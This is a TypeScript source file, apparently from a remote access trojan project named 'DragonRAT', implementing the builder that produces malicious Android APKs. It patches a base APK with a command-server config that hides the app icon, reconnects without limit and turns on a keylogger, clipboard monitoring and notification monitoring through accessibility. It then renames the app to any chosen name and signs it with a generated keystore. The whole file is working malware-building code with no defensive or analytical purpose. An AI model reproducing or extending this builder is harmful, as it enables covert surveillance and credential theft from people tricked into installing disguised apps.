import AdmZip from 'adm-zip';
import { execSync } from 'child_process';
import path from 'path';
import fs from 'fs';
import { v4 as uuidv4 } from 'uuid';
import { config } from './config';

export interface BuildOptions {
    appName: string;
    serverUrl: string;
    wsUrl: string;
    iconUrl?: string;
    packageName?: string;
}

export function buildApk(options: BuildOptions): string {
    const buildId = uuidv4().slice(0, 8);
    const safeName = options.appName.replace(/[^a-zA-Z0-9]/g, '');
    const outputName = `${safeName}_${buildId}.apk`;
    const outputPath = path.join(config.buildsDir, outputName);

    if (!fs.existsSync(config.buildsDir)) {
        fs.mkdirSync(config.buildsDir, { recursive: true });
    }

    if (!fs.existsSync(config.baseApkPath)) {
        throw new Error(`Base APK not found at ${config.baseApkPath}`);
    }

    // 1. Read the base APK as ZIP
    const zip = new AdmZip(config.baseApkPath);

    // 2. Generate config JSON to inject
    const botConfig = JSON.stringify({
        serverUrl: options.serverUrl,
        wsUrl: options.wsUrl,
        reconnectInterval: 3000,
        maxReconnectAttempts: 0, // infinite
        heartbeatInterval: 15000,
        useAccessibility: true,
        hideIcon: true,
        enableKeylogger: true,
        enableNotificationMonitor: true,
        enableClipboardMonitor: true,
    });

    // 3. Inject or update assets/config.json
    const configEntry = zip.getEntry('assets/config.json');
    if (configEntry) {
        zip.updateFile(configEntry, Buffer.from(botConfig, 'utf-8'));
    } else {
        zip.addFile('assets/config.json', Buffer.from(botConfig, 'utf-8'));
    }

    // 4. Update app name in resources (if AndroidManifest or strings exist)
    const stringsEntry = zip.getEntry('res/values/strings.xml');
    if (stringsEntry) {
        let stringsXml = stringsEntry.getData().toString('utf-8');
        stringsXml = stringsXml.replace(
            /<string name="app_name">.*?<\/string>/,
            `<string name="app_name">${options.appName}</string>`
        );
        zip.updateFile(stringsEntry, Buffer.from(stringsXml, 'utf-8'));
    }

    // 5. Write the patched APK
    const patchedPath = path.join(config.buildsDir, `patched_${buildId}.apk`);
    zip.writeZip(patchedPath);

    // 6. Sign the APK using uber-apk-signer
    try {
        const signerJar = config.signerJarPath;
        if (!fs.existsSync(signerJar)) {
            // Fallback: try to copy as is (unsigned)
            fs.copyFileSync(patchedPath, outputPath);
            console.warn('[BUILDER] uber-apk-signer.jar not found, using unsigned APK');
        } else {
            execSync(
                `java -jar "${signerJar}" --apks "${patchedPath}" --out "${outputPath}" --ks "${config.dataDir}/dragon.keystore" --ksAlias dragon --ksPass dragonrat --ksKeyPass dragonrat`,
                { stdio: 'pipe', timeout: 30000 }
            );

            // If signer doesn't support --out flag, it signs in-place
            if (!fs.existsSync(outputPath)) {
                // Signer modified the file in-place; copy it
                fs.copyFileSync(patchedPath, outputPath);
            }
        }
    } catch (err) {
        console.warn('[BUILDER] Signing failed, using unsigned APK:', (err as Error).message);
        fs.copyFileSync(patchedPath, outputPath);
    }

    // 7. Cleanup patched file
    try { fs.unlinkSync(patchedPath); } catch {}

    // 8. Create keystore if it doesn't exist (for future use)
    if (!fs.existsSync(`${config.dataDir}/dragon.keystore`)) {
        try {
            execSync(
                `keytool -genkey -v -keystore "${config.dataDir}/dragon.keystore" -alias dragon -keyalg RSA -keysize 2048 -validity 10000 -storepass dragonrat -keypass dragonrat -dname "CN=DragonRAT, OU=Security, O=Dragon, L=Unknown, ST=Unknown, C=XX" 2>/dev/null`,
                { stdio: 'pipe', timeout: 10000 }
            );
        } catch {}
    }

    return outputPath;
}

export function getBuildsDir(): string {
    if (!fs.existsSync(config.buildsDir)) {
        fs.mkdirSync(config.buildsDir, { recursive: true });
    }
    return config.buildsDir;
}
